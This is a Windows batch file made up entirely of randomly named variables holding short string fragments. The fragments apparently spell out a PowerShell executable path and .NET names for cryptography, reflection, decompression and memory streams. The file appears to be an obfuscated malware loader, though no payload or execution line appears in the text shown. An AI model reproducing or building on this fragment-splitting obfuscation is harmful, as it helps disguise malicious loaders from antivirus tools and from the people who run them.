@echo off
set "OJpMyBNlta=we"
set "muLMNPVkLs=Wi"
set "KNVpBBybsk=ow"
set "ZUREHEZOHb=we"
set "QvbrDcTIMV=:\"
set "pYmVNkWFwC=nd"
set "FdhAZTaXeZ=y "
set "rURBVlIrAr=em"
set "jRFmFerfiu=do"
set "wdpVvwxVJp=s\"
set "XztVmqMcRH=py"
set "xtuzhJVYsF= /"
set "RiIwfxeBGK= C"
set "YazIBKTRmn=.e"
set "fomjlyzwll=st"
set "hMpNmznmUf=xe"
set "mjTiiEQIYS=1."
set "RMWqvgzhEZ=rS"
set "bTQlbzSZiX=rs"
set "BRBDSYwSvM=ws"
set "BUPouSifDs=Sy"
set "uDGEuLqyit=Po"
set "qMszmXOgKD=0\"
set "MaWgaQXHUI=32"
set "tFbCaOpCZr=co"
set "DKcnNZLxKg=po"
set "XbKxYHcosi=in"
set "TsXSTvUORI=ll"
set "TAGFKBgGui=he"
set "OTXPFRCPer=ll"
set "ljSGOGkbSU=he"
set "ssxZfiRfKW=\W"
set "llyvVIGqjo=\v"
set "AZobEsBAme=cd"
set "BBkKUjyugx= %~dp0"
set "QzDgVBeToI= [Sy"
set "cEKTIdCPIN=ress"
set "xBdaDTQLeH=pose"
set "QiHyCFEejY=pres"
set "XCiYnwDQCM=  $Y"
set "icEkMBbfOC=]::("
set "bYlYMsThlq=TMgu"
set "gJPQeyDJBr=gnir"
set "ESemSczJtv=PRLi"
set "YISJqTHHoW=] -j"
set "BmdEGTUDFy=comm"
set "mQvSLYUxbw=3); "
set "zrhCkcSEgu=.Cry"
set "FodnioTCVt=m.Re"
set "knBePFMLwk=yste"
set "fbYdHZMYFU=)($Y"
set "qUbCMUmDsf=ApM "
set "FUFKWotAgd=MK.T"
set "vACTHBRPBv=esMa"
set "RNBzSNswWg=($xd"
set "pQORsEyGIW=ose("
set "KIoaGiybGb=U.Su"
set "vEoKLILPix=Star"
set "VTMHQBncTU=ose("
set "XpplPIkhAN=k; }"
set "iDmDAhqLWd=16] "
set "csBOmDXprP=bjec"
set "fhnrAIDLIN='gni"
set "ljzZUNUUKN=.IO."
set "zADzNCAdAX=fYI "
set "PRrpxyNzpb=.Mod"
set "RyfPpOFWma=..-1"
set "OdRGslwFjG=('da"
set "AAOXdUOkce=TMgu"
set "JvKlatgAYU='[-1"
set "SFrLSmFrWV=[Sys"
set "OZbxiYdSKV=th('"
set "VVLMIWPUoQ=oryS"
set "XGlwskMdQh=stem"
set "DOPlfkiQdH=);$B"
set "CiKSXvXfPe=);$H"
set "ToYvokxsdQ=-4] "
set "HlRNLngKVj=, (,"
set "KDnrlNRtHt=ateD"
set "hlKzjyfvpe=CFxo"
set "wZGojtOzmh=Disp"
set "impHVEGXPz=Conv"
set "McqOoKKfHi=iron"
set "PViCcGeiGk=gjYA"
set "AALnaWBard=).Sp"
set "NaEHQQwtzB=raph"
set "qaOBfwgewc=y.Cr"
set "exbONyBbsL=yste"
set "HktUTlCpcs=am;$"
set "WzuhfqEPfZ=();$"
set "SyjCkdRuaD=6] -"
set "kpBOdtPcex=le  "
set "YExGroYvrN=[Sys"
set "RwuwYqpUci= [st"
set "acdTWOzRiw=.Dis"
set "AjiDTzfRVj=lXOC"
set "nGJxihqOBi=ring"
set "bhmBIXIkdf=$lXO"
set "iLwVPPyvbK=XOCj"
set "bHmTgZVQnq=TMgu"
set "CWnfHWmesN=New-"
